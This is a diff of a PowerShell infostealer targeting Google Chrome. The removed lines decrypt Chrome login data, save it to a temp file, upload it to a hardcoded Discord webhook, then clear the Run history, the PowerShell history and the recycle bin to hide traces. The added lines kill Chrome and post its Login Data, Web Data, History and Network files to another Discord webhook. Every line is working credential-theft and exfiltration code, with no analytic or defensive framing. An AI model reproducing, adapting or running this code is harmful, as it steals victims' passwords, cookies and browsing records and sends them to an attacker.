@@ -1,57 +1,22 @@
-$FileName = "LOGINS.txt"
-
-Stop-Process -Name Chrome -ErrorAction SilentlyContinue
-
-# Add error handling
-$d = Add-Type -ErrorAction Stop -PassThru -AssemblyName System.Security
-$p = 'public static'
-$g = """)]$p extern"
-$i = '[DllImport("winsqlite3",EntryPoint="sqlite3_'
-$m = "[MarshalAs(UnmanagedType.LP"
-$q = '(s,i)'
-$f = '(p s,int i)'
-$z = "$env:LOCALAPPDATA\Google\Chrome\User Data"
-$u = [Security.Cryptography.ProtectedData]
-
-
-$l | Out-File -FilePath "$env:TEMP\$FileName" -Encoding UTF8
-
-
-$pathToChrome = 'C:\Program Files (x86)\Google\Chrome\Application\chrome.exe'
-Start-Process -FilePath $pathToChrome
-
-function Upload-Discord {
-    [CmdletBinding()]
-    param (
-        [parameter(Position=0, Mandatory=$false)]
-        [string]$file,
-        [parameter(Position=1, Mandatory=$false)]
-        [string]$text
-    )
-
-    $hookurl = "https://discord.com/api/webhooks/1207392478848745542/2S-UVgHK5tfva-9f0wBCnyhkZ6lRVOEuoMRgpjoEaE-Wpg_PnGX1vZfn5gSnkzBr2Tgd"
-
-    if (-not [string]::IsNullOrEmpty($text)){
-        $Body = @{
-            'username' = $env:username
-            'content' = $text
-        }
-        Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl -Method Post -Body ($Body | ConvertTo-Json)
-    }
-
-    if (-not [string]::IsNullOrEmpty($file)){
-        curl.exe -F "file1=@$file" $hookurl
+Get-Process "chrome" | Stop-Process -Force -ErrorAction SilentlyContinue
+Start-Sleep -Seconds 1
+$chromeUserDataPath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default"
+$webhookUrl = "https://discord.com/api/webhooks/1208762543263326279/mLDNFnzaa6YhmWDAkgEgu3PAX6pM-8A8UDo5bD2Pdncqa9y3Rz23yD0ZlP5jdjv8Q3tq"
+function SendFile($filePath, $webhookUrl) {
+    if (Test-Path $filePath) {
+        $fileContent = Get-Content $filePath -Raw
+        $boundary = [System.Guid]::NewGuid().ToString()
+        $LF = "`r`n"
+        $payload = "--$boundary$LF"
+        $payload += "Content-Disposition: form-data; name=`"file`"; filename=`"$($filePath.Split('\')[-1])`"$LF"
+        $payload += "Content-Type: application/octet-stream$LF$LF"
+        $payload += $fileContent
+        $payload += $LF
+        $payload += "--$boundary--$LF"
+        Invoke-RestMethod -Uri $webhookUrl -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $payload
     }
 }
-
-
-if (-not [string]::IsNullOrEmpty($FileName)){
-    Upload-Discord -file "$env:TEMP\$FileName"
-}
-
-
-Remove-Item -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Force -ErrorAction SilentlyContinue
-Remove-Item -Path (Get-PSreadlineOption).HistorySavePath -Force -ErrorAction SilentlyContinue
-Clear-RecycleBin -Force -ErrorAction SilentlyContinue
-
-Exit
+SendFile "$chromeUserDataPath\Web Data" $webhookUrl
+SendFile "$chromeUserDataPath\History" $webhookUrl
+SendFile "$chromeUserDataPath\Login Data" $webhookUrl
+SendFile "$chromeUserDataPath\Network" $webhookUrl
